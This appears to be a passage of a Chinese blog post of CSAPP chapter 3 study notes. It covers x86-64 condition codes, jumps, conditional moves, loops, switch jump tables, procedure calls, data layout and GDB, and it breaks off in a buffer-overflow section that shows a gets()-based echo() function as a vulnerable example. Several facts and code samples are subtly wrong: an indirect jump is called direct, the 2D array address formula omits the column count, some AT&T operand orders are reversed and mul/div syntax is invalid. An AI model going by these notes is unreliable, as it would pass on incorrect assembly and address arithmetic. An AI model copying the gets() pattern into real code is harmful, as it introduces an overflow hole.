title="条件码"></a>条件码</h4><p>除了整数寄存器，CPU还维护着一组单位个的条件码寄存器，用来描述最近的算术或逻辑操作的属性，用来判断并执行条件分支指令。常见的条件码如下：</p><table><thead><tr><th>指令</th><th>作用</th><th>描述</th></tr></thead><tbody><tr><td>CF</td><td>进位标志</td><td>判断是否产生进位</td></tr><tr><td>ZF</td><td>零标志</td><td>判断最近的结果是否为0</td></tr><tr><td>SF</td><td>符号标志</td><td>最近操作的结果是否为负数</td></tr><tr><td>OF</td><td>溢出标志</td><td>最近的操作是否导致补码溢出</td></tr></tbody></table><p>leaq 指令不会改变任何条件码，因为它是用地址进行计算的。除此之外，所有的指令都会设置条件码。同时需要注意，INC 和 DEC 指令不会改变进位标志，CMP 指令和 TEST 指令只改变条件码。</p><blockquote><p>除了对寄存器的操作，CMP指令和SUB指令的行为相同，TEST指令和ADD指令的行为相同</p></blockquote><h4 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h4><p>机器并不是直接去读取条件吗，常用的方法有以下三种：</p><ul><li>根据条件码的某种组合，将一个字节设置为0或1。我们将这类指令称为 SET 指令</li><li>条件跳转到程序的某个其他的部分</li><li>有条件地传送数据</li></ul><p>每一条 SET 指令的后缀都指明了它们所考虑的条件码的组合，需要注意的是后缀表示的是不同的条件而不是不同的操作数。具体的 SET 指令如下表：</p><table><thead><tr><th align="center">指令</th><th align="center">同义后缀</th><th align="center">条件码</th><th align="center">设置条件</th></tr></thead><tbody><tr><td align="center">sete</td><td align="center">z</td><td align="center">ZF&#x3D;&#x3D;1</td><td align="center">相等（零）</td></tr><tr><td align="center">setne</td><td align="center">nz</td><td align="center">ZF&#x3D;&#x3D;0</td><td align="center">不相等（不为零）</td></tr><tr><td align="center">sets</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;1</td><td align="center">负数</td></tr><tr><td align="center">setns</td><td align="center">&#x2F;</td><td align="center">SF&#x3D;&#x3D;0</td><td align="center">非负数</td></tr><tr><td align="center">setg</td><td align="center">nle</td><td align="center">(SF^OF)&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">（有符号）大于</td></tr><tr><td align="center">setge</td><td align="center">nl</td><td align="center">(SF^OF)&#x3D;&#x3D;0</td><td align="center">（有符号）大于等于</td></tr><tr><td align="center">setl</td><td align="center">nge</td><td align="center">(SF^OF)&#x3D;&#x3D;1</td><td align="center">（有符号）小于</td></tr><tr><td align="center">setle</td><td align="center">ng</td><td align="center">(SF^OF)&#x3D;&#x3D;1|ZF</td><td align="center">（有符号）小于等于</td></tr><tr><td align="center">seta</td><td align="center">nbe</td><td align="center">CF&#x3D;&#x3D;0&amp;ZF&#x3D;&#x3D;0</td><td align="center">（无符号）大于</td></tr><tr><td align="center">setae</td><td align="center">nb</td><td align="center">CF&#x3D;&#x3D;0</td><td align="center">（无符号）大于等于</td></tr><tr><td align="center">setb</td><td align="center">nae</td><td align="center">CF&#x3D;&#x3D;1</td><td align="center">（无符号）小于</td></tr><tr><td align="center">setbe</td><td align="center">na</td><td align="center">CF|ZF&#x3D;&#x3D;1</td><td align="center">（无符号）小于等于</td></tr></tbody></table><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>前面提到机器需要指令来实现指令执行的切换，跳转（jump）指令就会导致执行切换到程序中一个全新的位置。在汇编代码中，这些跳转的目的地通常用一个标号（label）指明。</p><p><code>jmp</code> 指令是无条件跳转，它可以直接跳转，即跳转目标是作为指令的一部分编码，比如 <code>jmp *%rax</code> ；也可以间接跳转，即跳转目标需要从寄存器或内存位置读出，比如 <code>jmp *(%rax)</code> 。</p><p><code>jmp</code> 指令的条件指令就是 <code>j+后缀</code> ，具体后缀和上面 <code>set</code> 后缀部分相同，对应条件也相同。</p><p>跳转指令的目标值是一个地址，它主要有两种编码方式：</p><ul><li>绝对地址：给出绝对地址，用四字节直接指定要跳转到的内存地址。</li><li>相对地址：用偏移量编码，将目标指令的地址与紧跟在跳转指令后面的指令地址之间的差值作为编码，编译器或汇编器会完成这些工作。</li></ul><h4 id="条件分支的实现"><a href="#条件分支的实现" class="headerlink" title="条件分支的实现"></a>条件分支的实现</h4><p>条件分支是编程中常用的一种控制结构，它允许根据条件的成立与否来执行不同的代码路径。条件分支通常可以通过两种主要方法来实现：条件控制和条件传送语句。</p><h5 id="条件控制来实现条件分支"><a href="#条件控制来实现条件分支" class="headerlink" title="条件控制来实现条件分支"></a>条件控制来实现条件分支</h5><p>在条件控制中，程序使用条件语句（如 <code>if</code>、<code>else if</code> 、<code>else</code> ）来检查一个或多个条件表达式，并基于这些条件的真假来选择执行不同的代码块。</p><p>条件控制通常使用分支指令（如条件跳转指令）来实现，例如，在汇编语言中，<code>jz</code>（跳转如果零）、<code>jnz</code>（跳转如果不为零）等指令可用于根据条件跳转到不同的代码段。</p><p>条件控制的一个典型示例是使用 <code>if </code>语句来根据条件执行不同的代码块。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125; <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>在汇编代码中我们就可以写成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    cmp rdi, rsi     ; 比较 x 和 y<br>    jg L1      ; 如果 x &gt; y，则跳转到 greater<br>    mov rax, 0      ; 否则，将 0 存储在 %rax 中<br>    jmp done<br>L1:<br>    mov rax, 1      ; 如果 x &gt; y，则将 1 存储在 %rax 中<br>done:<br>    ; 返回结果并退出<br>    ret<br></code></pre></td></tr></table></figure><h5 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h5><p>条件传送语句是一种通过条件来选择是否将一个值传送到目标寄存器或内存位置的机制，使用数据实现条件转移。它通常用于执行非常简单的条件分支，其中只有两个可能的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (x&gt;y) <br>&#123;<br>    result=x-y;<br>&#125; <br><span class="hljs-keyword">else</span><br>&#123;<br>    result=y-x;<br>&#125;<br></code></pre></td></tr></table></figure><p>在汇编代码中我们就可以写成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   movq %rdi,%rax<br>   subq %rsi,%rax          ;let %rax=x-y<br>   movq %rsi,%rbx<br>   subq %rdi,%rbx          ;let %rbx=y-x<br>cmp %rsi,%rdi<br>cmovle %rbx,%rax        ;if x&lt;=y movq %rbx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>注意观察上面的汇编代码，它会先把两种结果都算出来，最后再根据判断结果赋值。虽然这种方法看上去执行的步骤更多，但是实际上它的运行速度更快。</p><h5 id="条件控制和条件传送的比较"><a href="#条件控制和条件传送的比较" class="headerlink" title="条件控制和条件传送的比较"></a>条件控制和条件传送的比较</h5><p>处理器通过流水线来获得高性能，在流水线中，机器会重叠连续指令，比如在执行某一条指令的同时会同时执行它前面一条的算术运算。</p><p>像前面的条件传送语句中，他的计算步骤是同时进行的；但是由于条件控制语句在执行完毕之前，不能确定程序是否要跳转，也就无法知道它接下来要执行的指令，所以我们只能等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>C语言中的很多循环例如 do-while 、while 和 for 。汇编中并没有相应的代码来直接实现这些操作，但是可以用条件测试和跳转组合来实现循环的效果。</p><h5 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">do</span>&#123;<br><span class="hljs-comment">//bodyment</span><br>i--;<br>&#125;<br><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>它对应的汇编代码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq $10,%rcx     <br>do:<br>    ;do bodyment<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    jns do<br></code></pre></td></tr></table></figure><p>同样，其他的循环也有对应的实现方法</p><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>       i--;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">do:<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    js end<br>    ;do bodyment<br>    jmp do<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>&#123;<br>       <span class="hljs-comment">//bodyment</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rcx,0<br>do:<br>    ;something<br>    addq %rcx,$1<br>    cmpq $10,%rcx<br>    jl do<br></code></pre></td></tr></table></figure><p>综上，上方的三个循环都可以用条件分支代码的思路去实现，由控制来构成机器代码。</p><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p><code>switch</code> 语句可以根据一个整数索引值进行多重分支，当开关的情况数量比较多，并且值的跨度范围比较小时，会通过使用<strong>跳转表</strong>来实现程序的高效性。</p><p>跳转表是一个数组或类似数据结构，其中每个 <code>case</code> 标签对应一个表项。每个表项包含两部分信息：条件值和跳转目标。在跳转的判断部分，程序会在跳转表中直接查找 <code>switch </code> 表达式的值对应的条件值，<strong>只进行一次判断</strong>就跳转到指定位置运行。</p><p>比如下面这段C语言代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">switch_eg</span><span class="hljs-params">(n)</span><br>&#123;<br>    <span class="hljs-type">int</span> val=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">switch</span>(n)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            val+=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            val*=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            val/=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            val--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L1:<br>    .quad .L2<br>    .quad .L3<br>    .quad .L4<br>    .quad .L5<br>    .quad .L6<br><br>switch_eg:<br>    movq $1,%rax<br>    subq $1,%rdi    ;rdi 也就是 n ，其值要匹配跳转表的索引<br>    cmpq $3,%rdi<br>    ja L6<br>    jmp *.L1(,%rdi,8)    ;跳转表<br>L2:<br>    addq $2,%rax<br>    jmp end<br>L3: <br>    subq $2,%rax<br>    jmp end<br>L4:<br>    mul $2,%rax<br>    jmp end<br>L5:<br>    div $2,%rax<br>    jmp end<br>L6:<br>    addq $1,%rax<br>end:<br>    ret<br></code></pre></td></tr></table></figure><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过程是软件中很重要的抽象，它提供了一种封装代码的方式，用一组参数和可选的返回值实现了某种功能。我们可以在程序中不同的地方调用这个函数。</p><p>我们假设过程 P 调用过程 Q ，Q 执行后返回到 P。</p><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>C语言过程调用机制的一个关键特性就是使用了栈数据结构提供的后进先出的内存管理原则。</p><p>当某个函数运行时所需要的局部变量超过了寄存器的数量，就会在栈上开辟空间，这个在栈上分配的空间就称为这个函数的栈帧。</p><p>当 P 调用 Q 时，会把 P 的状态保存起来，并存储 Q 调用结束后的返回地址，调用完以后再恢复到调用前的状态。需要注意这个<strong>返回地址属于 P 的帧的一部分</strong>。</p><h4 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h4><p>当控制从函数 P 转移到函数 Q 只需要把程序计数器（PC）设置为 Q 的起始地址，但当 Q 调用结束返回 P时，处理器必须记住 P 应该继续执行的代码位置，这个信息就是由 <code>call</code> 指令来记录的。</p><p><code>call Q</code> 指令用来调用 Q ，同时它会将 P 当前的地址 A 压入栈中，并将 PC 设置为 Q 的起始地址。地址 A 就是函数 Q 的返回地址，也是 <code>ret</code> 指令的地址。ret 指令紧跟在 call 指令之后，会从栈中弹出返回地址 A，并把 PC 重新设置为 A ，继续函数 P 的执行。</p><p>call 指令和 ret 指令的一般形式如下：</p><table><thead><tr><th>指令</th><th>描述</th><th>作用</th></tr></thead><tbody><tr><td>call  <em>Label</em></td><td>过程调用</td><td>控制程序跳转到被调用过程的指令地址</td></tr><tr><td>call  *<em>Operand</em></td><td>过程调用</td><td>控制程序跳转到被调用过程的指令地址</td></tr><tr><td>ret</td><td>从过程调用中返回</td><td>控制程序返回到调用它的地方</td></tr></tbody></table><p>这两个指令对应的寄存器层面的变化如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%80.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%802.png"></p><p>call 指令执行前</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%89%8D.png"></p><p>call 指令执行完毕后，<em>rip</em> 寄存器指向调用的函数 <code>foo()</code> 的地址 <code>0x4004e7</code>，此时 <em>rsp</em> 指向返回地址 <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6call%E5%90%8E.png"></p><p>ret 执行后 <em>rip</em> 寄存器指向原本 <code>foo()</code> 函数对应的返回地址 <code>0x400514</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E8%BD%AC%E7%A7%BB%E6%8E%A7%E5%88%B6ret%E5%90%8E.png"></p><h4 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h4><p>在函数调用的过程中，不仅要把控制在过程中传递，还需要传递数据参数。</p><p>在 x86-64 中，大部分的过程间的数据传递是通过寄存器实现的。寄存器最多传递六个整数，顺序是： %rdi，%rsi，%rdx，%rcx，%r8，%r9 ，其余参数自右向左依次入栈。</p><h4 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h4><p>有一些局部数据必须放在内存中，具体情况如下：</p><ul><li>寄存器不足以存放所有的本地数据</li><li>对局部变量使用地址运算符 <code>&amp;</code> 进行取地址操作</li><li>变量是数组或结构，必须通过引用来访问</li></ul><h4 id="寄存器中的局部存储空间"><a href="#寄存器中的局部存储空间" class="headerlink" title="寄存器中的局部存储空间"></a>寄存器中的局部存储空间</h4><p>我们知道，寄存器是在整个过程中共享的资源，我们需要保证 在一个过程调用另一个过程时，被调用者不会覆盖调用者将要使用的寄存器的值，以保证调用结束后程序可以正常运行。对此 x86-64 有一组统一的寄存器使用惯例。</p><p> 惯例中：%rbx,%rbp,%r12~%r15 被划分为<strong>被调用者保存寄存器</strong>，就是被调用函数不回去待变这些寄存器的值。而其它的寄存器，除了 %rsp 都分类为<strong>调用者保存寄存器</strong>，也就是任何函数都可以改变它们。</p><p>我们可以这样理解“调用者保存”这个名字，Q 被调用时可以随意改变这些寄存器，那么保存好这些数据就是调用者 P 的责任。</p><h3 id="数组的分配和访问"><a href="#数组的分配和访问" class="headerlink" title="数组的分配和访问"></a>数组的分配和访问</h3><p>C语言中的数组是一种将标量数据据继承更大数据类型的方式。</p><h4 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h4><p>对于数据类型 T 和整型常数 N，数组声明为 <code>T A[N];</code> ，它的起始位置我们表示为 <em>xA</em> ，数组占用的字节数是 <em>sizeof(T)* N</em> ，我们访问 A[i] ,实际上就是访问 <em>xA + sizeof(T)* i</em>  。</p><h4 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h4><p>C语言允许且对指针进行运算，计算出来的值会根据引用该指针的数据类型的大小进行伸缩。也就是说表达式 p+i  相当于 *xp+sizeof(type)<em>i</em> 的地址（xp 表示数组 p 的基地址）。</p><h4 id="嵌套的数组"><a href="#嵌套的数组" class="headerlink" title="嵌套的数组"></a>嵌套的数组</h4><p>我们使用的二维数组，例如 <code>int A[5][3];</code>，等价于 <code>typedef int row3_t[3]; row3_t A[5]</code>，这种就是嵌套声明。</p><p>我们要访问多维数组 <code>T D[R][C]</code> 的元素 <em>D[i][j]</em>  ，对应的内存地址是 <em>xD+sizeof(T) *i+sizeof(T) *j</em>  。</p><h3 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h3><p>C语言提供了两种将不同类型对象结合到一起创建数据类型的机制：结构和联合</p><h4 id="结构（struct"><a href="#结构（struct" class="headerlink" title="结构（struct)"></a>结构（struct)</h4><p><code>struct</code> 也叫结构体，将可能不同类型的基本数据聚和到一个对象当中，用名字来引用结构的各个部分。编译器维护关于每个结构类型的信息，指示每个字段的字节偏移，作为内存引用指令中的位移，用来实现各个元素的引用。</p><p>也就是说，我们想要访问结构体中的某个对象，只需要将结构体的地址再加上这个字段的偏移即可。</p><h4 id="联合（union"><a href="#联合（union" class="headerlink" title="联合（union)"></a>联合（union)</h4><p>联合的声明方式和结构体相同，但不同的是联合内的<strong>所有成员变量共享同一块内存</strong>，只能同时访问一个数据成员，而结构体中的数据成员各自独立的占用内存，所以可以被同时访问。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">U</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">double</span> v;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 U的指针 <code>p</code> ，<code>p-&gt;c</code> 和<code>p-&gt;i[0]</code>都是指向 U 的起始位置。</p><h4 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h4><p>许多计算系统都对数据类型的合法地址做出了一些限制，要求某些数据对象的地址必须是某个值的倍数。例如处理器总是从内存中取 8 字节，那么有效地址就必须是 8 字节的倍数，这样我们可以保证用一个内存操作来读、写值了。</p><p>例如下面的结构体，如果没有对齐要求，我们认为他们的内存占用情况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//5+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但实际上是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//8+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>画出图就是下面的样子，灰色部分是为了对内对齐导致的两个数据成员之间的空的间隙</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90.png"></p><p>因为不同的数据类型都必须对其相应的值K，具体如下表：</p><table><thead><tr><th>K</th><th>类型</th></tr></thead><tbody><tr><td>1</td><td>char</td></tr><tr><td>2</td><td>short</td></tr><tr><td>4</td><td>int , float</td></tr><tr><td>8</td><td>long , double , char*</td></tr></tbody></table><h3 id="在机器级程序中将控制与数据结合起来"><a href="#在机器级程序中将控制与数据结合起来" class="headerlink" title="在机器级程序中将控制与数据结合起来"></a>在机器级程序中将控制与数据结合起来</h3><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p><del>指针我一生之敌！</del></p><p>指针是C语言的特色，它们允许程序直接访问计算机内存中的数据。每个指针都对应一个类型，表示了它指向的内存为什么数据类型。</p><p>以下是指针的特点：</p><ul><li><code>*</code> 操作符是间接引用指针，结果数据是该指针的类型</li><li>每个指针都有一个值，这个值就是某个指定类型对象的地址，NULL(0) 也是一个值，表示指针并没有指向任何地方</li><li>对指针进行强制类型转换值，改变它的类型，不改变它的值</li><li>指针可以指向函数</li></ul><p>我们这样来声明一个指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">type *name ;   <br>type (*name) (arglist) ;  <span class="hljs-comment">//指向函数，括号必须将*和函数名括在一起</span><br></code></pre></td></tr></table></figure><h4 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h4><p>GNU 调试器 GDB 提供了许多有用的特性，支持机器级程序运行时的分析。我们可以用下面的指令启动GDB并调试程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gdb filename</span><br></code></pre></td></tr></table></figure><p>输入 help(h) 就可以查看具体的命令，常用的命令如下：</p><table><thead><tr><th>调试命令 (缩写)</th><th>作用</th></tr></thead><tbody><tr><td>break (b)  xxx</td><td>在源代码指定的某一行设置断点，其中 xxx 用于指定具体打断点位置</td></tr><tr><td>run (r）</td><td>执行被调试的程序，其会自动在第一个断点处暂停执行</td></tr><tr><td>continue (c）</td><td>当程序在某一断点处停止后，用该指令可以继续执行，直至遇到断点或者程序结束</td></tr><tr><td>next (n)</td><td>令程序一行代码一行代码的执行</td></tr><tr><td>step（s）</td><td>如果有调用函数，进入调用的函数内部；否则，和 next 命令的功能一样</td></tr><tr><td>until (u)</td><td>当你厌倦了在一个循环体内单步跟踪时，单纯使用 until 命令，可以运行程序直到退出循环体</td></tr><tr><td>until n</td><td>命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止</td></tr><tr><td>print (p）xxx</td><td>打印指定变量的值，其中 xxx 指的就是某一变量名</td></tr><tr><td>list (l)</td><td>显示源程序代码的内容，包括各行代码所在的行号</td></tr><tr><td>finish（fi）</td><td>结束当前正在执行的函数，并在跳出函数后暂停程序的执行</td></tr><tr><td>return（return）</td><td>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行</td></tr><tr><td>jump（j)</td><td>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码</td></tr><tr><td>quit (q)</td><td>终止调试，退出 GDB shell</td></tr><tr><td>kill (k)</td><td>杀死程序，强制终止正在被调试的异常程序</td></tr></tbody></table><h4 id="内存越界引用和缓冲区溢出"><a href="#内存越界引用和缓冲区溢出" class="headerlink" title="内存越界引用和缓冲区溢出"></a>内存越界引用和缓冲区溢出</h4><p>C在数组引用的时不会进行任何边界检查，而且局部变量和状态信息都存放在栈中，两者结合起来就会导致严重的程序错误，破坏栈中存储的信息，如果保持这个被破坏的信息并试图重新加载寄存器或者尝试执行 ret ，就会导致程序发生错误。</p><p>一种常见的状态破坏被称为<strong>缓冲区溢出</strong>，通常发生子啊在我们在栈中分配字符数组的时候，输入的字符串的长度超出了为它分配的空间大小。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">echo</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    gets(buf);    <span class="hljs-comment">//gets不会对输入数据的长度进行判断，只有遇到&quot;\n&quot;才会停止读取</span><br>    <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 